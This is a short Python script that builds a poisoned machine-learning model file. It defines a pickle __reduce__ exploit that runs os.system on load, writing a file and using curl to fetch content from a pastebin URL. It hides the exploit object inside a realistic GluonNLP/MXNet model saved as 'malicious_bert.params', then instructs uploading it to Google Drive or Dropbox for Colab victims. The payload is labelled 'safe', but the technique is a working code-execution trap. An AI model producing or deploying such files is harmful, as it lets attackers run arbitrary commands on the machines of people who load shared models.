# File: create_malicious_model.py
import pickle
import os
import gluonnlp as nlp
from mxnet import gluon

class Exploit:
    def __reduce__(self):
        # SAFE payload - just creates a proof file
        return (os.system, (
            'echo "Model loaded from untrusted source!" > /content/security_alert.txt && '
            'curl -s https://pastebin.com/raw/test123 > /content/vulnerability_proof.txt'
        ,))

# 1. Create a realistic-looking model
model = gluon.nn.Sequential()
model.add(gluon.nn.Dense(128, activation='relu'))
model.add(gluon.nn.Dense(2))

# 2. Hide exploit in model parameters
malicious_payload = {
    'model': model,
    'vocab': nlp.Vocab(['safe', 'data']),
    '__exploit__': Exploit()  # Will trigger on load
}

# 3. Save as standard GluonNLP format
with open('malicious_bert.params', 'wb') as f:
    pickle.dump(malicious_payload, f)

print("Malicious model saved as 'malicious_bert.params'")
print("Upload this file to Google Drive/Dropbox for Colab access")
